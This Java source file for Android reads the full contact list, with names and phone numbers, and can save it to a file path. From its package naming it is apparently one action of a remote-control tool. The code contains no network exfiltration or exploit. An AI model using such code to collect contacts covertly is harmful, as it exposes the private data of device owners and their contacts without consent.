package com.lfish.control.action.actiontool;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import com.lfish.control.ControlApplication;

public class LinkMan {
	private Context context;

	public LinkMan() {
		this.context = ControlApplication.context;
	}

	public String getLinks() {
		StringBuilder stringBuilder = new StringBuilder();
		Cursor cur = context.getContentResolver().query(
				ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		if ((null != cur) && (cur.moveToFirst())) {
			do {
				String id = cur.getString(cur
						.getColumnIndex(ContactsContract.Contacts._ID));
				String displayName = cur
						.getString(cur
								.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				stringBuilder.append("姓名:" + displayName + "  号码:");
				int phoneCount = cur
						.getInt(cur
								.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

				if (phoneCount > 0) {

					Cursor phonesCursor = context.getContentResolver().query(
							ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
							null,
							ContactsContract.CommonDataKinds.Phone.CONTACT_ID
									+ "=" + id, null, null);
					if (phonesCursor.moveToFirst()) {

						do {
							String phoneNumber = phonesCursor
									.getString(phonesCursor
											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							phonesCursor
									.getInt(phonesCursor
											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
							stringBuilder.append(" " + phoneNumber + ", ");
						} while (phonesCursor.moveToNext());
					}
					if (null != phonesCursor) {
						phonesCursor.close();
					}
				}
				stringBuilder.append("\r\n");
			} while (cur.moveToNext());
			if (cur != null) {
				cur.close();
				cur = null;
			}
		} else {
			stringBuilder.append("no contacts");
		}
		return stringBuilder.toString();
	}
	public void savetoPath(String ss, String path) {

		File f = new File(path);
		if (f.exists()) {

			f.delete();

		}
		try {
			f.createNewFile();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		String content = ss;
		try {
			FileOutputStream outputStream = new FileOutputStream(new File(path));
			outputStream.write(content.getBytes());
			outputStream.flush();
			outputStream.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
